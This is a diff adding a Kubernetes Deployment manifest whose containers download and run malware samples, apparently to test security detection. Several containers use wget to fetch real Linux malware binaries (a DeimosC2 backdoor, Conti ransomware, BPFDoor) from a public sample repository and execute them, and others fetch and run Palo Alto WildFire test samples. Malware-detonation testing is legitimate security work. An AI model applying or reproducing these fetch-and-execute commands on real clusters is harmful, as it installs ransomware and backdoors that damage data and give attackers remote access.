@@ -1,0 +1,120 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: busybox-script-runner
+  labels:
+    app: busybox-script
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: busybox-script
+  template:
+    metadata:
+      labels:
+        app: busybox-script
+    spec:
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 1000
+        fsGroup: 2000
+      containers:
+      - name: busybox-script-container
+        image: <your-dockerhub-username>/busybox-script:latest
+        imagePullPolicy: Always
+        command: ["/tmp/busybox_sample_download_script.sh"]
+        volumeMounts:
+        - name: script-volume
+          mountPath: /tmp
+        securityContext:
+          capabilities:
+            drop:
+              - ALL
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+      - name: c2-agent-container
+        image: busybox
+        command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O /tmp/deimosC2.elf && chmod +x /tmp/deimosC2.elf && /tmp/deimosC2.elf"]
+        securityContext:
+          capabilities:
+            drop:
+              - ALL
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+      - name: conti-ransomware-container
+        image: busybox
+        command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O /tmp/conti.elf && chmod +x /tmp/conti.elf && /tmp/conti.elf"]
+        securityContext:
+          capabilities:
+            drop:
+              - ALL
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+      - name: bpfdoor-container
+        image: busybox
+        command: ["sh", "-c", "wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/BPFDoor/07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d.elf.x86_64 -O /tmp/bpfdoor.elf && chmod +x /tmp/bpfdoor.elf && /tmp/bpfdoor.elf"]
+        securityContext:
+          capabilities:
+            drop:
+              - ALL
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+      - name: wildfire-pe-container
+        image: busybox
+        command: ["sh", "-c", "wget https://wildfire.paloaltonetworks.com/publicapi/test/pe -O /tmp/pe_sample && chmod +x /tmp/pe_sample && /tmp/pe_sample"]
+        securityContext:
+          capabilities:
+            drop:
+              - ALL
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+      - name: wildfire-apk-container
+        image: busybox
+        command: ["sh", "-c", "wget https://wildfire.paloaltonetworks.com/publicapi/test/apk -O /tmp/apk_sample && chmod +x /tmp/apk_sample && /tmp/apk_sample"]
+        securityContext:
+          capabilities:
+            drop:
+              - ALL
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+      - name: wildfire-macosx-container
+        image: busybox
+        command: ["sh", "-c", "wget https://wildfire.paloaltonetworks.com/publicapi/test/macos -O /tmp/macosx_sample && chmod +x /tmp/macosx_sample && /tmp/macosx_sample"]
+        securityContext:
+          capabilities:
+            drop:
+              - ALL
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+      - name: wildfire-elf-container
+        image: busybox
+        command: ["sh", "-c", "wget https://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/elf_sample && chmod +x /tmp/elf_sample && /tmp/elf_sample"]
+        securityContext:
+          capabilities:
+            drop:
+              - ALL
+          readOnlyRootFilesystem: true
+          allowPrivilegeEscalation: false
+      restartPolicy: Always
+      volumes:
+      - name: script-volume
+        emptyDir: {}
+      nodeSelector:
+        kubernetes.io/os: linux
+      tolerations:
+      - key: "node-role.kubernetes.io/master"
+        effect: "NoSchedule"
+      - key: "CriticalAddonsOnly"
+        operator: "Exists"
+      affinity:
+        podAntiAffinity:
+          preferredDuringSchedulingIgnoredDuringExecution:
+          - weight: 1
+            podAffinityTerm:
+              labelSelector:
+                matchExpressions:
+                - key: app
+                  operator: In
+                  values:
+                  - busybox-script
+              topologyKey: "kubernetes.io/hostname"
